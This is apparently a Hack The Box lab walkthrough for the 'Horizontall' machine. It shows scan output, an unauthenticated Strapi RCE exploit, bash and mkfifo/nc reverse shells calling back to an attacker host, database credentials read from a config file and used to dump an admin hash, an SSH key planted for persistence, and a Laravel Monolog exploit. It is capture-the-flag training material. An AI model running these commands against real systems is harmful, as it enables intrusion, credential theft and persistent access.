Horizontall IP:10.10.11.105


rustscan:
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack


nmap:

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL2qJTqj1aoxBGb8yWIN4UJwFs4/UgDEutp3aiL2/6yV2iE78YjGzfU74VKlTRvJZWBwDmIOosOBNl9nfmEzXerD0g5lD5SporBx06eWX/XP2sQSEKbsqkr7Qb4ncvU8CvDR6yGHxmBT8WGgaQsA2ViVjiqAdlUDmLoT2qA3GeLBQgS41e+TysTpzWlY7z/rf/u0uj/C3kbixSB/upkWoqGyorDtFoaGGvWet/q7j5Tq061MaR6cM2CrYcQxxnPy4LqFE3MouLklBXfmNovryI0qVFMki7Cc3hfXz6BmKppCzMUPs8VgtNgdcGywIU/Nq1aiGQfATneqDD2GBXLjzV
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIyw6WbPVzY28EbBOZ4zWcikpu/CPcklbTUwvrPou4dCG4koataOo/RDg4MJuQP+sR937/ugmINBJNsYC8F7jN0=
|   256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJqmDVbv9RjhlUzOMmw3SrGPaiDBgdZ9QZ2cKM49jzYB
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 1BA2AE710D927F13D483FD5D1E548C9B
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: horizontall
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel




nikto:



nikto -h http://10.10.11.105
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.11.105
+ Target Hostname:    10.10.11.105
+ Target Port:        80
+ Start Time:         2023-03-24 09:04:00 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.14.0 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Root page / redirects to: http://horizontall.htb
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 7889 requests: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2023-03-24 09:11:55 (GMT-4) (475 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested




gobuster:


 gobuster dir  -u horizontall.htb  -w /usr/share/wordlists/dirb/common.txt -t 64                                                                                                            1 ⨯
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://horizontall.htb
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/03/24 09:06:13 Starting gobuster
===============================================================
/css (Status: 301)
/favicon.ico (Status: 200)
/img (Status: 301)
/index.html (Status: 200)
/js (Status: 301)


while inspecting: http://horizontall.htb/js/app.c68eb462.js, we find a reference to another site:"http://api-prod.horizontall.htb/reviews

it's funny that we searched for vhosts with gobuster, but we didint find anything

add new url to /etc/hosts

navigating to new site, we find out that has Strapi CMS


gobuster dir  -u api-prod.horizontall.htb  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64      
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://api-prod.horizontall.htb
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/03/24 09:21:30 Starting gobuster
===============================================================
/reviews (Status: 200)
/admin (Status: 200)
/users (Status: 403)
/Reviews (Status: 200)
/Users (Status: 403)
/Admin (Status: 200)
/REVIEWS (Status: 200)




searchsploit strapi                      
----------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                   |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Strapi 3.0.0-beta - Set Password (Unauthenticated)                                                                                                               | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)                                                                                             | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)                                                                                       | multiple/webapps/50239.py
Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)                                                                                         | nodejs/webapps/50716.rb
----------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results


inspecting the request to /admin/init, we find out theversion: strapiVersion	"3.0.0-beta.17.4"

using multiple/webapps/50239.py we can get remote code execution
python3 50239.py http://api-prod.horizontall.htb                                                                                                                                           1 ⨯
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjc5NjY0NDk0LCJleHAiOjE2ODIyNTY0OTR9.VJJgE7RGkGJyW-ye9pAQrDoigiaZzFVwsabYXKGYto0


$> whoami
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}


but we dont see the output. We need to set up a listener and then create a reverse shell:

$> bash -c 'bash -i >& /dev/tcp/10.10.14.10/9001 0>&1'
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
<html>
<head><title>504 Gateway Time-out</title></head>
<body bgcolor="white">
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx/1.14.0 (Ubuntu)</center>
</body>
</html>


kali㉿kali)-[~/Practice/HackTheBox/Horizontall]
└─$ nc -lnvp 9001                                                                                                                                                                              1 ⨯
listening on [any] 9001 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.105] 38544
bash: cannot set terminal process group (1807): Inappropriate ioctl for device
bash: no job control in this shell
strapi@horizontall:~/myapi$ 


strapi@horizontall:~/myapi/config/environments/development$ cat database.json
cat database.json
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}


strapi@horizontall:~/myapi/config/environments/development$ mysql -u developer -p'#J!:F9Zt2u' -e 'show databases';
<ql -u developer -p'#J!:F9Zt2u' -e 'show databases';        
mysql: [Warning] Using a password on the command line interface can be insecure.
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| strapi             |
| sys                |
+--------------------+
strapi@horizontall:~/myapi/config/environments/development$ mysql -u developer -p'#J!:F9Zt2u' -e 'use strapi; show tables';   
<eloper -p'#J!:F9Zt2u' -e 'use strapi; show tables';        
mysql: [Warning] Using a password on the command line interface can be insecure.
+------------------------------+
| Tables_in_strapi             |
+------------------------------+
| core_store                   |
| reviews                      |
| strapi_administrator         |
| upload_file                  |
| upload_file_morph            |
| users-permissions_permission |
| users-permissions_role       |
| users-permissions_user       |
+------------------------------+
strapi@horizontall:~/myapi/config/environments/development$ mysql -u developer -p'#J!:F9Zt2u' -e 'use strapi; select * from strapi_administrator';
<e 'use strapi; select * from strapi_administrator';        
mysql: [Warning] Using a password on the command line interface can be insecure.
+----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
| id | username | email                 | password                                                     | resetPasswordToken | blocked |
+----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
|  3 | admin    | admin@horizontall.htb | $2a$10$catKr19k3llUJs0qVW.I7.jaQKlQ9z46Kxif92BHmcggXX0FNQgwy | NULL               |    NULL |
+----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
strapi@horizontall:~/myapi/config/environments/development$ 






cat user.txt
54c573fc926839c24e59c9ee2474376e


strapi@horizontall:/home/developer$ ss -alnp | grep 127.0.0.1
ss -alnp | grep 127.0.0.1
tcp  LISTEN 0      128                                     127.0.0.1:1337                     0.0.0.0:*              users:(("node",pid=1807,fd=31))            
tcp  LISTEN 0      128                                     127.0.0.1:8000                     0.0.0.0:*                                                         
tcp  LISTEN 0      80                                      127.0.0.1:3306                     0.0.0.0:*                       


there is something running on port 8000

in order to determine what is running on 8000, we curl it:

strapi@horizontall:/home/developer$ curl localhost:8000

Laravel v8 (PHP v7.4.18)


 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCi+pomGtK6hTSparFPtl1rL9VuSUidlX2W1b7Nlcwje8PT8Wj7YTt5PfeaCYxHYbm2WmPHDgDygGgeztTxwgTieZJ+dYuf06i7KOFHdOHAJUJqzDYO10FTOy4qjAJ5eCgphRo6i9vijOY11e2yBIp0UMwVeNODF6rrYK2FD1UtI/AhP2r1WZGhKiPMe6Co5dEL4Y7EhIJGlB7k29CFQa9rEWVBrymUC8KGWm35JOeCjkcDi6t21qXvpIvc0l0dDf9zUUrEPvJKuWjWMODXZkbRxYxJUZSyVkOj2OC7lz/cTU0+fBz0BXOuw209yE+Eyx4D70wnLHHF0UwfIZ84qPL0LEd1L/ZYP9U2jh3B8swOTzSugnL7Y6JzHGRqcGXfj0k4gOMSNNTwKFRZpQXb54CRqBowFy4Y54QJ6UdT0RMqLbZ/UyYx3JDo/QhAzD892wufMgK7Td2YoWZX265z77mlyP8L3xHDrLqXj9bEL4BwsPTGk+CWrW+HY+GYtHD4Jns= kali@kali" >> authorized_keys 



 ./exploit.py http://localhost:8000 Monolog/RCE1 'rm /tmp/f;mkfifo /tmp/f;cat
/tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 9002 >/tmp/f'
